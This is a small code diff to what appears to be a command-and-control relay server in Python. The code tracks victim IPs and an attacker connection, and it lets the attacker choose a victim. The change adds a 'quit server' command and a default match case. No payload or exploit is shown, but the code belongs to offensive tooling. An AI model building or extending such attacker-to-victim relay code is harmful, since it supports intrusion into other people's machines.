@@ -37,7 +37,9 @@ def main():
                 send_options(victims_ips, socket_of_server, ip)
             case "attacker exit":
                 ip_of_attacker = ''
-            case other:
+            case "quit server":
+                break
+            case _:
                 if d.startswith('choice'):
                     choice = int(d[6:])
                     if choice < len(victims_ips):
